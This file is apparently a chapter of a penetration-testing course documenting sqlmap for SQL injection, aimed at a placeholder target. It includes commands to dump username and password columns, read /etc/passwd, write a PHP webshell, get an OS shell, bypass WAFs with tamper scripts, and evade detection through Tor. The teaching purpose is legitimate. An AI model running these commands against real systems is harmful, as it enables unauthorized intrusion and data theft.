# sqlmap — Complete Reference (Including WAF Bypass)

sqlmap automates everything covered manually in files 02–06. This file explains every flag
used, not just "run this command" — understanding *why* a flag is needed lets you adapt when
sqlmap's defaults don't work against a specific target.

## 1. Basic Detection

```bash
sqlmap -u "https://target.com/product?id=1" --batch
```

Breakdown:
- `-u "URL"` — the target URL; sqlmap treats every parameter in the query string (`id=1`
  here) as a candidate injection point and tests each one with its full payload library.
- `--batch` — runs non-interactively, accepting sqlmap's suggested default answer at every
  prompt (e.g., "do you want to test other parameters too?") instead of pausing for manual
  confirmation — essential for scripting/automation, but review the chosen defaults in
  verbose mode at least once per engagement to make sure they're actually appropriate.

### 1.1 Specifying Injectable Parameter Explicitly

```bash
sqlmap -u "https://target.com/product?id=1&cat=2" -p id --batch
```

Breakdown:
- `-p id` — restricts testing to only the `id` parameter, skipping `cat` entirely. Use this
  once you already know (from manual testing) exactly which parameter is vulnerable, to save
  significant scan time versus testing every parameter blindly.

### 1.2 POST Data / Headers / Cookies

```bash
sqlmap -u "https://target.com/login" --data="username=admin&password=test" -p username
```

Breakdown:
- `--data="..."` — supplies the POST body sqlmap should send; presence of `--data` switches
  the request method to `POST` automatically.
- `-p username` — same parameter-targeting flag as above, this time pointing at a POST
  parameter instead of a URL query parameter.

```bash
sqlmap -u "https://target.com/profile" --cookie="session=abc123" --headers="X-Forwarded-For: 1.1.1.1"
```

Breakdown:
- `--cookie="..."` — sends the specified `Cookie` header value with every test request,
  needed for any endpoint that requires an authenticated session.
- `--headers="..."` — injects arbitrary additional headers; also necessary if you want sqlmap
  to test the *header value itself* as an injection point (combine with `--level` below).

### 1.3 Testing Custom Headers/Cookies As Injection Points

```bash
sqlmap -u "https://target.com/profile" --cookie="session=1*" --level=5
```

Breakdown:
- `1*` inside the cookie value — the `*` marks the exact byte position sqlmap should inject
  its payloads into, when the parameter isn't part of the URL/POST body (i.e., a header or
  cookie value) and so isn't auto-detected as a parameter.
- `--level=5` — sqlmap's test depth, 1 (lowest) to 5 (highest). Higher levels test more
  injection points (headers, cookies, `Referer`, `User-Agent`) and more payload variations,
  at the cost of significantly more requests/time. Level 5 is needed to make sqlmap actually
  probe non-standard locations like cookies and headers by default — at level 1, only GET/POST
  parameters are tested.

## 2. Detection Tuning Flags

```bash
sqlmap -u "https://target.com/product?id=1" --risk=3 --level=5 --batch
```

Breakdown:
- `--risk=3` — controls how "aggressive"/potentially destructive the test payloads are, 1
  (lowest, safe) to 3 (highest — includes payloads like `OR`-based boolean tests that can
  return/modify large result sets, and time-based tests that add real load). Risk 3 should
  only be used with explicit client authorization given its potential for unwanted side
  effects on a live production database.
- `--level=5` — as above, maximum thoroughness; combine carefully with `--risk=3` only when
  the engagement scope and time budget explicitly support it.

```bash
sqlmap -u "https://target.com/product?id=1" --technique=BEUST
```

Breakdown:
- `--technique=` — restricts which SQLi *type* sqlmap attempts, using single-letter codes:
  `B`=Boolean-blind, `E`=Error-based, `U`=UNION, `S`=Stacked queries, `T`=Time-based blind,
  `Q`=Inline queries. Restricting this (e.g., to just `BT` for blind-only testing) speeds up
  scans dramatically when you already know — from manual testing — which technique class is
  viable, instead of letting sqlmap brute-force test all of them.

## 3. DBMS Fingerprint & Enumeration

```bash
sqlmap -u "https://target.com/product?id=1" --banner --current-user --current-db --is-dba
```

Breakdown:
- `--banner` — retrieves the database version banner string (equivalent to the manual
  `@@version`/`version()` queries from file 01).
- `--current-user` — returns the DB user the current connection is authenticated as.
- `--current-db` — returns the name of the database currently in use by the connection.
- `--is-dba` — checks whether the current DB user holds administrative/superuser privileges,
  directly informing whether file read/write or command execution (section 6) is likely
  to succeed.

```bash
sqlmap -u "https://target.com/product?id=1" --dbs
```

Breakdown:
- `--dbs` — enumerates the names of all databases the current user can see, the automated
  equivalent of querying `information_schema.schemata` manually.

```bash
sqlmap -u "https://target.com/product?id=1" -D appdb --tables
```

Breakdown:
- `-D appdb` — selects a specific database (`appdb`) as the enumeration target for whatever
  flag follows.
- `--tables` — lists every table within that selected database, equivalent to manually
  querying `information_schema.tables` (file 02).

```bash
sqlmap -u "https://target.com/product?id=1" -D appdb -T users --columns
```

Breakdown:
- `-T users` — selects the specific table (`users`) within the already-selected database.
- `--columns` — lists every column name (and data type) in that table, equivalent to manually
  querying `information_schema.columns WHERE table_name='users'`.

```bash
sqlmap -u "https://target.com/product?id=1" -D appdb -T users -C username,password --dump
```

Breakdown:
- `-C username,password` — restricts the dump to only these two named columns, instead of
  dumping every column in the table (faster, and avoids pulling irrelevant data unrelated to
  the finding being demonstrated).
- `--dump` — actually extracts and prints/saves the row data for the selected table/columns,
  using whichever technique (`--technique`) was detected/specified as viable.

```bash
sqlmap -u "https://target.com/product?id=1" --dump-all --exclude-sysdbs
```

Breakdown:
- `--dump-all` — dumps every table in every accessible database, used sparingly given the time
  and storage cost — generally reserved for confirming full-database compromise impact in a
  report rather than routine testing.
- `--exclude-sysdbs` — skips built-in system databases (e.g., `information_schema`, `mysql`,
  `sys`) so the dump only contains application-relevant data, not DBMS internals.

## 4. Session / Authentication Handling

```bash
sqlmap -u "https://target.com/account" --cookie="session=abc123" --auth-type=basic --auth-cred="user:pass"
```

Breakdown:
- `--cookie="session=abc123"` — as before, maintains an existing session token across all
  test requests, necessary for any endpoint gated behind login.
- `--auth-type=basic` — tells sqlmap the target also requires HTTP Basic Authentication (a
  separate auth layer from app-level session cookies, e.g., an `.htaccess`-protected staging
  environment in front of the app).
- `--auth-cred="user:pass"` — the actual Basic Auth credentials to send with every request.

```bash
sqlmap -u "https://target.com/account" --cookie="session=abc123" --csrf-token="csrf_token" --csrf-url="https://target.com/account"
```

Breakdown:
- `--csrf-token="csrf_token"` — names the parameter sqlmap should treat as a CSRF token and
  refresh automatically.
- `--csrf-url="..."` — the page sqlmap should fetch first to harvest a fresh CSRF token value
  before each test request, needed because many CSRF tokens are single-use or session-bound
  and a stale token would otherwise cause every request to be rejected by the app before SQLi
  testing even begins.

```bash
sqlmap -u "https://target.com/account" -r request.txt
```

Breakdown:
- `-r request.txt` — loads an entire raw HTTP request (headers, cookies, body — typically
  copy-pasted directly from Burp Suite's "Copy to file" feature) instead of manually
  reconstructing all of `--cookie`/`--data`/`--headers` individually. This is the most
  reliable way to ensure sqlmap replicates a complex authenticated session exactly as the
  browser/Burp captured it.

## 5. Stacked Queries / OS Shell / File Read & Write

```bash
sqlmap -u "https://target.com/product?id=1" --os-shell
```

Breakdown:
- `--os-shell` — sqlmap's fully automated pipeline to reach interactive OS command execution.
  Internally, this chains: confirming stacked-query support → writing a webshell to disk via
  file-write primitives (MySQL `INTO OUTFILE`, MSSQL `xp_cmdshell`, etc. — see file 08 for the
  manual mechanics behind each) → invoking that webshell through HTTP to relay further shell
  commands. Requires the DB user to have both stacked-query capability and sufficient
  filesystem/command-execution privileges (hence checking `--is-dba` first, section 3).

```bash
sqlmap -u "https://target.com/product?id=1" --file-read="/etc/passwd"
```

Breakdown:
- `--file-read="path"` — automates the manual `LOAD_FILE()`/`xp_cmdshell 'type ...'`-style
  techniques covered in file 08, abstracting away the DBMS-specific syntax differences and
  directly returning the requested file's contents.

```bash
sqlmap -u "https://target.com/product?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

Breakdown:
- `--file-write="local_path"` — the local file on your machine whose *contents* will be
  written to the target.
- `--file-dest="remote_path"` — the absolute path on the target server where that content
  should be written, requiring both stacked-query/file-write privilege and a web-accessible,
  writable directory for this to result in usable remote code execution afterward.

## 6. Output & Reporting Helpers

```bash
sqlmap -u "https://target.com/product?id=1" --batch -v 3 --output-dir=./sqlmap-output
```

Breakdown:
- `-v 3` — verbosity level (0–6); level 3 shows the actual injection payloads being tried in
  real time, useful for understanding *which* technique succeeded — directly relevant when
  writing up exactly how the vulnerability was confirmed for the report.
- `--output-dir=` — saves all session data, logs, and dumped data to a specified directory
  instead of sqlmap's default location, keeping engagement evidence organized per-target.

---

## 7. sqlmap WAF Bypass Section

### 7.1 Identifying The WAF

```bash
sqlmap -u "https://target.com/product?id=1" --identify-waf
```

Breakdown:
- `--identify-waf` — sends a small set of known-bad-looking requests and inspects the
  responses (status codes, headers, response body signatures) against sqlmap's built-in
  database of WAF/IPS fingerprints (Cloudflare, Akamai, ModSecurity/OWASP CRS, Imperva, etc.),
  reporting which product is likely in front of the target — informing which tamper scripts
  (below) are most likely to be effective.

### 7.2 The `--tamper` Flag

```bash
sqlmap -u "https://target.com/product?id=1" --tamper=space2comment
```

Breakdown:
- `--tamper=script_name` — applies a Python script that rewrites/mutates the final payload
  *after* sqlmap generates it, but *before* sending it over the wire — applying exactly the
  same kind of manual evasion tricks covered in file 06, automatically and consistently.
- Multiple tampers can be chained, comma-separated: `--tamper=space2comment,randomcase`,
  applied in the order listed.

### 7.3 Full Tamper Script Reference Table

| Tamper Script | What It Actually Does |
|---|---|
| `space2comment` | Replaces every space character with `/**/`, defeating filters that match on literal whitespace adjacent to SQL keywords (mechanism: file 06 §3). |
| `space2plus` | Replaces spaces with `+`, relying on the HTTP-layer `+`-as-space decoding behavior described in file 06 §4. |
| `space2randomblank` | Replaces spaces with a randomly chosen whitespace-equivalent byte (tab, newline, vertical tab) each time, defeating filters that only strip one specific whitespace variant. |
| `charencode` | URL-encodes every character in the payload (e.g., `'` → `%27`), useful against filters that pattern-match on raw, unencoded payload text before the app's own URL-decoding occurs. |
| `charunicodeencode` | Encodes characters using `%uXXXX`-style Unicode escapes (file 06 §5.3's technique), targeting legacy stacks that decode this format but whose WAF doesn't normalize it. |
| `randomcase` | Randomizes the case of every SQL keyword (`UNION` → `UnIoN`), defeating case-sensitive signature matching (file 06 §2). |
| `apostrophemask` | Replaces the literal apostrophe `'` with its UTF-8 fullwidth lookalike equivalent, evading filters that block only the exact ASCII apostrophe byte — relies on the target's character-set handling normalizing it back to a functional quote. |
| `apostrophenullencode` | Replaces `'` with an illegal/double-URL-encoded representation that some backend stacks still resolve into a literal quote during request parsing, while bypassing front-end filters expecting the standard encoded form. |
| `equaltolike` | Replaces every `=` operator with `LIKE`, which is semantically equivalent for exact-match string comparisons in most DBMS but isn't typically included in `=`-focused WAF signatures. |
| `greatest` | Replaces `>` (greater-than) comparisons with the `GREATEST()` function wrapped equivalently, evading signatures keyed specifically on the `>` character. |
| `versionedkeywords` | Wraps SQL keywords in MySQL versioned-comment syntax (`/*!50000UNION*/`, per file 06 §3), so the keyword is invisible to filters not specifically aware of MySQL's executable-comment format. |
| `versionedmorekeywords` | Same mechanism as `versionedkeywords` but applies it to a broader set of keywords (logical operators, functions), for filters with partial versioned-comment awareness. |
| `between` | Replaces `>`/`<` comparisons with `NOT BETWEEN ... AND ...` equivalents, evading signatures keyed on raw comparison operators. |
| `bluecoat` | Replaces a space after SQL keywords with a randomly-chosen valid alternative whitespace character, originally tuned against Blue Coat WAF/proxy normalization quirks. |
| `halfversionedmorekeywords` | A more selective variant of `versionedmorekeywords`, applying versioned-comment wrapping only to a curated keyword subset to reduce payload bloat/breakage on stricter SQL parsers. |
| `modsecurityversioned` | Wraps the entire payload in versioned comments specifically structured to slip past ModSecurity's default OWASP Core Rule Set patterns. |
| `modsecurityzeroversioned` | Variant using a `/*!00000 ... */` zero-version marker, targeting ModSecurity configurations that don't normalize that specific format. |
| `multiplespaces` | Inserts multiple consecutive spaces around keywords, defeating naive filters expecting exactly one space in a matched sequence. |
| `nonrecursivereplacement` | Constructs payloads so that if the WAF performs a single-pass keyword-stripping replacement (e.g., removing "UNION" once), the remaining characters reassemble back into the original blocked keyword. |
| `percentage` | Prepends a `%` before each character (ASP-specific quirk) — some legacy ASP-based stacks strip the resulting pattern back to the original character during their own internal parsing, while WAF signatures miss the `%`-prefixed form. |
| `plus2concat` | Replaces `+`-based string concatenation with the equivalent `CONCAT()` function call syntax, useful against signatures specifically targeting `+`-based concatenation patterns. |
| `space2dash` | Replaces spaces with a `--` comment sequence followed by a random string and a newline, exploiting comment-based whitespace-equivalence on DBMS that support line comments. |
| `space2mssqlblank` / `space2mssqlhash` | MSSQL-specific whitespace substitutions tuned to that DBMS's particular comment/whitespace parsing quirks. |
| `unionalltounion` | Replaces `UNION ALL SELECT` with plain `UNION SELECT`, evading signatures specifically keyed on the `UNION ALL` two-keyword sequence. |
| `unmagicquotes` | Appends a trailing comment-out sequence specifically crafted to neutralize PHP's legacy `magic_quotes_gpc` automatic-escaping behavior on older PHP versions. |
| `xforwardedfor` | Adds a randomized, spoofed `X-Forwarded-For` header value to each request, targeting WAFs/rate-limiters that apply different (looser) rules based on perceived "internal" or trusted source IPs. |

### 7.4 Writing A Custom Tamper Script

When none of the built-in scripts work, sqlmap supports custom Python tamper modules:

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload.replace("UNION", "/*custom*/UNION/*custom*/")
```

Breakdown:
- `__priority__ = PRIORITY.LOWEST` — tells sqlmap's tamper pipeline to apply this script last,
  after any other chained tampers — relevant because tamper order changes the final payload;
  most custom scripts should run last so they operate on the already-mutated string rather
  than a string other tampers haven't touched yet.
- `def dependencies():` — an optional hook where you can raise an error if this tamper is
  incompatible with another active tamper or a specific DBMS — left empty here since this
  example has no conflicts.
- `def tamper(payload, **kwargs):` — the required entry point; sqlmap calls this function with
  the current payload string and expects the (possibly modified) string back.
- `payload.replace("UNION", "/*custom*/UNION/*custom*/")` — the actual mutation logic; this
  example wraps `UNION` in custom comment markers as a simple illustrative case — in practice,
  base custom tampers on whatever specific signature you've identified the WAF matching on
  during manual testing (file 06), then automate exactly that bypass here.
- Save the file under sqlmap's `tamper/` directory, then reference it the same way as a
  built-in script: `--tamper=my_custom_script`.

### 7.5 Rate-Limit / Detection Evasion

```bash
sqlmap -u "https://target.com/product?id=1" --random-agent --delay=2 --randomize=id
```

Breakdown:
- `--random-agent` — selects a random, realistic `User-Agent` header from sqlmap's built-in
  list for each request, instead of sqlmap's default identifiable `sqlmap/x.x.x` user agent
  string — defeating simple UA-string-based WAF/logging detection.
- `--delay=2` — waits 2 seconds between each HTTP request, reducing the request rate to stay
  under WAF/rate-limiter thresholds that flag or block bursts of rapid requests.
- `--randomize=id` — randomizes the *value* of the named parameter (here `id`) on every
  request where it isn't the actual focus of the current test, useful for evading anomaly
  detection systems that flag a single static parameter value being hammered repeatedly.

```bash
sqlmap -u "https://target.com/product?id=1" --tor --tor-type=SOCKS5 --check-tor
```

Breakdown:
- `--tor` — routes all sqlmap traffic through a locally running Tor client, rotating the
  apparent source IP — relevant against IP-based rate-limiting/blocking, though note this is
  rarely appropriate or authorized on client engagements; mentioned here for completeness on
  what's technically available, not as a default recommendation.
- `--tor-type=SOCKS5` — specifies the local Tor proxy protocol type to connect through.
- `--check-tor` — verifies the Tor connection is actually active and anonymizing traffic
  before sqlmap proceeds, preventing a false sense of anonymity if the Tor setup is broken.

## 8. Real-World Notes

- **Common mistake:** Running sqlmap at default settings against a WAF-protected target and
  concluding "not vulnerable" when it's actually just being blocked at the network edge before
  reaching the app. Always run `--identify-waf` first, and don't trust a clean sqlmap result
  against a fingerprinted WAF without at least attempting a tamper chain.
- **Engagement reality:** sqlmap is loud — by default it sends a very large number of test
  requests very quickly. On rate-limited or monitored production targets, this can trigger
  account lockouts, IP bans, or alert the client's SOC mid-engagement. Always confirm pacing
  expectations (`--delay`, `--randomize`) are within the agreed Rules of Engagement before
  running an unthrottled scan.
- **Report-writing tip:** Capture the exact sqlmap command line used (including any
  `--tamper`/`--technique`/`--risk` flags) in the report's technical appendix — this lets the
  client's security team reproduce the finding exactly, and demonstrates the bypass chain
  that defeated their WAF specifically, which is often itself a separate, reportable finding.

## Next File
→ `08-advanced-topics.md` — Stacked queries, file read/write internals, SQLi-to-RCE chains,
auth bypass cheatsheet, and injection context variations.
